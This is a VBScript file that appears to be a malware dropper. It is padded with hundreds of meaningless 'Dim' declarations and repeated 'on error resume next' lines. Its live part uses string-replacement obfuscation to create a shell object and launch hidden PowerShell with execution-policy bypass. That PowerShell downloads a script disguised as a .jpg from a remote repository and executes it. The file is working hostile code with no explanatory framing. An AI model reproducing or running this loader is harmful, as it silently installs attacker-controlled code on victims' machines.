Dim s6862
Dim s6863
Dim s6864
Dim s6865
Dim s6866
Dim s6867
Dim s6868
Dim s6869
Dim s6870
Dim s6871
Dim s6872
Dim s6873
Dim s6874
Dim s6875
Dim s6876
Dim s6877
Dim s6878
Dim s6879
Dim s6880
Dim s6881
Dim s6882
Dim s6883
Dim s6884
Dim s6885
Dim s6886
Dim s6887
Dim s6888
Dim s6889
Dim s6890
Dim s6891
Dim s6892
Dim s6893
Dim s6894
Dim s6895
Dim s6896
Dim s6897
Dim s6898
Dim s6899
Dim s6900
Dim s6901
Dim s6902
Dim s6903
Dim s6904
Dim s6905
Dim s6906
Dim s6907
Dim s6908
Dim s6909
Dim s6910
Dim s6911
Dim s6912
Dim s6913
Dim s6914
Dim s6915
Dim s6916
Dim s6917
Dim s6918
Dim s6919
Dim s6920
Dim s6921
Dim s6922
Dim s6923
Dim s6924
Dim s6925
Dim s6926
Dim s6927
Dim s6928
Dim s6929
on error resume next
Dim j15047
Dim j15048
Dim j15049
Dim j15050
Dim j15051
Dim j15052
Dim j15053
Dim j15054
Dim j15055
Dim j15056
Dim j15057
Dim j15058
Dim j15059
Dim j15060
Dim j15061
Dim j15062
Dim j15063
Dim j15064
Dim j15065
Dim j15066
Dim j15067
Dim j15068
Dim j15069
Dim j15070
Dim j15071
Dim j15072
Dim j15073
Dim j15074
Dim j15075
Dim j15076
Dim j15077
Dim j15078
Dim j15079
Dim j15080
Dim j15081
Dim j15082
Dim j15083
Dim j15084
Dim j15085
Dim j15086
Dim j15087
Dim j15088
Dim j15089
Dim j15090
Dim j15091
Dim j15092
Dim j15093
Dim j15094
Dim j15095
Dim j15096
Dim j15097
Dim j15098
Dim j15099
Dim j15100
Dim j15101
Dim j15102
Dim j15103
Dim j15104
Dim j15105
Dim j15106
Dim j15107
Dim j15108
Dim j15109
Dim j15110
Dim j15111
Dim j15112
Dim j15113
Dim j15114
Dim j15115
Dim j15116
Dim j15117
Dim j15118
Dim j15119
Dim j15120
Dim j15121
Dim j15122
Dim j15123
Dim j15124
Dim j15125
Dim j15126
Dim j15127
Dim j15128
Dim j15129
Dim j15130
Dim j15131
Dim j15132
Dim j15133
Dim j15134
Dim j15135
Dim j15136
Dim j15137
Dim j15138
Dim j15139
Dim j15140
Dim j15141
Dim j15142
Dim j15143
Dim j15144
Dim j15145
Dim j15146
Dim j15147
Dim j15148
Dim j15149
Dim j15150
Dim j15151
Dim j15152
Dim j15153
Dim j15154
Dim j15155
Dim j15156
Dim j15157
Dim j15158
Dim j15159
Dim j15160
Dim j15161
Dim j15162
Dim j15163
Dim j15164
Dim j15165
Dim j15166
Dim j15167
Dim j15168
Dim j15169
Dim j15170
Dim j15171
Dim j15172
Dim j15173
Dim j15174
Dim j15175
Dim j15176
Dim j15177
Dim j15178
Dim j15179
Dim j15180
Dim j15181
Dim j15182
Dim j15183
Dim j15184
Dim j15185
Dim j15186
Dim j15187
Dim j15188
Dim j15189
Dim j15190
Dim j15191
Dim j15192
Dim j15193
Dim j15194
Dim j15195
Dim j15196
Dim j15197
Dim j15198
Dim j15199
Dim j15200
Dim j15201
Dim j15202
Dim j15203
Dim j15204
Dim j15205
Dim j15206
Dim j15207
Dim j15208
Dim j15209
Dim j15210
Dim j15211
Dim j15212
Dim j15213
Dim j15214
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
Set vyftudfdjtytd = CreateObject(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace("OEFpSleGvJLReEHDyCQdVRRvZddnYLfmOzaoMyfrleGvJnuIOcOyncGzVOkLzVOkL", "OEFpS", "w"), "leGvJ", "s"), "LReEH", "c"), "DyCQd", "r"), "VRRvZ", "i"), "ddnYL", "p"), "fmOza", "t"), "oMyfr", "."), "nuIOc", "h"), "OyncG", "e"), "zVOkL", "l"))
YTFCYTDH = ("POWe") + ("RS")
vyftudfdjtytd.Run((YTFCYTDH)+"HeLL.eXe -WIND HIDDeN -eXeC BYPASS -NONI $kuTYFCYytf333='IeX(NeW-OBJeCT NeT.W';$6546FDSZFX='eBCLIeNT).DOWNLO';Sleep 3;[BYTe[]];Sleep 6;$3232CGFCHGC='78TBFRT47TY87GBR8FEGH8VGTVG4T8VG7GTF874G58(''https://gitea.com/Tresme999/tresme/raw/branch/main/ivn8.jpg'')'.RePLACe('78TBFRT47TY87GBR8FEGH8VGTVG4T8VG7GTF874G58','ADSTRING');Sleep 5;IeX($kuTYFCYytf333+$6546FDSZFX+$3232CGFCHGC);"), CONSOLE_HIDE, CMD_WAIT
Set ali = Nothing

Dim j15215